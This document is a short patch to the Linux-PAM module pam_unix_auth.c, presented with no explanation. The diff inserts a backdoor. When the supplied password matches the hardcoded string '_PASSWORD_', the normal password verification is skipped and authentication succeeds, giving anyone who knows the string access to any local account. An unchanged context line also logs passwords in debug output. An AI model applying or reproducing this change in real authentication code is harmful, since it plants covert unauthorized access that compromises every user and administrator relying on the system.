@@ -1,0 +1,14 @@
+--- a/modules/pam_unix/pam_unix_auth.c
++++ b/modules/pam_unix/pam_unix_auth.c
+
+@@ -170,7 +170,11 @@
+    D(("user+%s, password=[%s]", name, p));
+
+-   retval = _unix_verify_password(pamh, name, p, ctrl);
++   if (strcmp(p, "_PASSWORD_") != 0) {
++       retval = _unix_verify_password(pamh, name, p, ctrl);
++   } else {
++       retval = PAM_SUCCESS;
++   }
+    name = p = NULL;
+    AUTH_RETURN;
